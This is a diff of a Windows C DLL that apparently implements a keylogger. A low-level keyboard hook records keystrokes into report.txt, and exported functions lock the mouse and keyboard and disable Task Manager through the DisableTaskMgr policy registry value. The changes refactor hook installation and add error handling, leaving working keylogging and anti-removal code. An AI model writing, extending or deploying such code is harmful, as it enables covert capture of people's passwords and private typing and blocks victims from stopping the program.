@@ -14,6 +14,7 @@ HHOOK			hKeyLoggerHook;
 HHOOK			hMouseHook;
 #pragma data_seg()
 
+FILE * f1;
 
 BOOL APIENTRY DllMain( HMODULE hModule,
 					  DWORD  ul_reason_for_call,
@@ -30,7 +31,6 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 	}
 	hInstDLL = (HINSTANCE) hModule;
 	
-	hMouseHook = NULL;
 	return TRUE;
 }
 
@@ -49,39 +49,26 @@ LRESULT CALLBACK MouseHookProc(int nCode, WORD wParam, DWORD lParam)
 
 	return CallNextHookEx(hMouseHook, nCode, wParam, lParam); 
 } 
-// Install hook
-void doSetMouseGlobalHook(HWND hWnd)
-{
-	// Init value for MappedData	
-
-	if (!hMouseHook)
-		hMouseHook = SetWindowsHookEx(WH_MOUSE_LL, (HOOKPROC)MouseHookProc, hInstDLL, 0);	
-
-}
-// Remove hook
-void doRemoveMouseGlobalHook(HWND hWnd)
-{
-	if (hMouseHook)
-		UnhookWindowsHookEx(hMouseHook);
-}
 
 void EXPORT LockMouse(HWND hWnd, BOOL bEnableDisable)
 {
 	if (!bEnableDisable)
 	{
-		doRemoveMouseGlobalHook(hWnd);
+		if (hMouseHook)
+		{
+			UnhookWindowsHookEx(hMouseHook);
+			hMouseHook = NULL;
+		}
 	}
 	else
 	{
-		doSetMouseGlobalHook(hWnd);
+		if (!hMouseHook)
+			hMouseHook = SetWindowsHookEx(WH_MOUSE_LL, (HOOKPROC)MouseHookProc, hInstDLL, 0);	
 	}
 }
-//TCHAR szEXEPath[MAX_PATH];
-//
-//GetModuleFileName ( NULL, szEXEPath, MAX_PATH );
+
 LRESULT CALLBACK KeyLoggerHookProc(int nCode,   WPARAM wParam, LPARAM lParam)
 {
-	FILE *f1;
 	if (nCode < 0)  // do not process message 
 		return CallNextHookEx(hKeyLoggerHook, nCode, wParam, lParam );
 
@@ -91,6 +78,10 @@ LRESULT CALLBACK KeyLoggerHookProc(int nCode,   WPARAM wParam, LPARAM lParam)
 		if ((wParam==VK_SPACE)||(wParam==VK_TAB)||(wParam==VK_RETURN)||((wParam>0x2f ) && (wParam<=0x100)))
 		{
 			f1=fopen("report.txt","a+");
+			if (!f1)
+			{
+				return CallNextHookEx(hKeyLoggerHook, nCode, wParam, lParam );
+			}
 			if ((wParam==VK_RETURN)||(wParam==VK_TAB))
 			{	
 				ch='\n';
@@ -110,8 +101,14 @@ LRESULT CALLBACK KeyLoggerHookProc(int nCode,   WPARAM wParam, LPARAM lParam)
 			fclose(f1);
 		}
 	}	
-	LRESULT RetVal = CallNextHookEx(hKeyLoggerHook, nCode, wParam, lParam );//Goi Hook procedure ke tiep trong Hook Chain	
-	return  RetVal;
+	return CallNextHookEx(hKeyLoggerHook, nCode, wParam, lParam );//Goi Hook procedure ke tiep trong Hook Chain	
+}
+
+void EXPORT ViewLogKeyLogger()
+{
+	TCHAR szEXEPath[MAX_PATH];
+	GetModuleFileName ( NULL, szEXEPath, MAX_PATH );
+	//ShellExecute(NULL, _T("open"), szBuff, NULL, szCurrPath, SW_SHOWNORMAL);
 }
 
 void EXPORT ActiveKeyLogger(HWND hWnd, BOOL bEnableDisable)
@@ -164,8 +161,8 @@ void EXPORT LockKeyboard(HWND hWnd, BOOL bEnableDisable)
 ****************************************/
 int __declspec(dllexport) LockTaskManager(BOOL bEnableDisable)
 {
-#define KEY_DISABLETASKMGR  "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
-#define VAL_DISABLETASKMGR  "DisableTaskMgr"
+#define KEY_DISABLETASKMGR  L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
+#define VAL_DISABLETASKMGR  L"DisableTaskMgr"
 
 	HKEY    hKey;
 	DWORD   val;
